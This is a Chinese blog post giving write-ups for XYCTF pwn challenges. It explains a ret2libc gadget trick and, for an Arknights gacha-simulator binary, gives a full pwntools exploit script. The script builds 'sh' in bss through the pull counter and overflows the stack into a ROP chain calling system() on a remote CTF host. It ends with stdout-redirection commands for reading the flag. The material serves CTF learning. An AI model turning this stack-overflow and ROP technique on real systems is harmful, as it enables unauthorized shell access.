---
title: XYCTF PWN WP
date: '2025-04-04 14:52:16'
updated: '2025-04-07 21:33:52'
---
## ret2libc_revenge
![](/images/23377d4fdbb87b16a187ec0bba633e4a.png)

没有 canary，got 表部分可写，没有 PIE

![](/images/39eae9c858d7399501e3a0601e61a3ec.png)

没有简单的 gadget 可以控制 rdi 的值，估计得去仔细看看 IDA 的反编译代码了

看见这两个 gadget

![](/images/8e3d8b1ea3d46770ca128625a996f16e.png)

![](/images/ead207e8aa07999d1051059684fe8626.png)

可以控制`[rbp+20h]`位置的数据从而控制 rdi 的值

但是因为在栈溢出的时候，rbp 会被覆盖掉，而本来没有栈地址，所以要想控制`[rbp+20h]`的数据，

就得选择`[rbp+20h]` 的位置是 puts_got 的 rbp 的地址来覆盖，这个点刚开始没想到，看了看 xi_ix 师傅写的协作文档

## 明日方舟寻访模拟器
在 xsctf 的时候 clby 师傅出的题目（还更新了这几个月新增的干员，我哭死...），之前打通的脚本的地址因为新增了数据所以得改一下，再加上之前没有做出来，只复现过，所以这次写一下 WP

从 main 函数里面可以看到在准备退出程序前的输入名字的 read 存在栈溢出，可以控制 main 函数的返回地址来 ROP

![](/images/3ca1f9fc81fd72183870e87d79a5276e.png)

![](/images/98c92f5c2ed3bcda3be61a342399e720.png)

用 ROPgadget 也可以找到要用的 gadget

![](/images/63ca155b957522fcf69f1006a6042907.png)

### 关键 bss 段构造"sh"
ascii 码（十六进制）：s--73  h--68

因为是小端序，所以应该在 bss 段构造一个 0x6873 的数据，又因为寻访次数会存在 bss 段![](/images/fa09a9b063edb5d4011191b4f18fc186.png)

所以可以利用寻访次数来构造字符串"sh"

完整 exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("47.93.96.189",22749)
# link=process('./arknights')
# elf=ELF("./arknights")

# gdb.attach(link,"b *0x4018F5")
# pause()

pop_rdi=0x4018e5
system=0x4018FC
count=0x405BCC
ret=0x40191C

def employ(n):
    link.send(b'\n')
    link.recv()
    link.sendline(b'3')
    link.recv()
    link.sendline(str(n).encode())

#在bss段构造“sh”
employ(10000)
employ(10000)
employ(6739)

link.send(b'\n')
link.recv()
link.sendline(b'4')
link.recv()
link.sendline(b'1')
link.recv()

# payload=b'a'*0x48+p64(ret)+p64(pop_rdi)+p64(count)+p64(system)
payload=b'a'*0x48+p64(pop_rdi)+p64(count)+p64(system)
link.send(payload)
link.interactive()
```

getshell发现`standard output: Bad file descriptor`

是因为`close(1)`关闭了标准输出，可以通过重定向获取flag：

`cat flag 1>&0 `或者 `cat flag 1>&2`

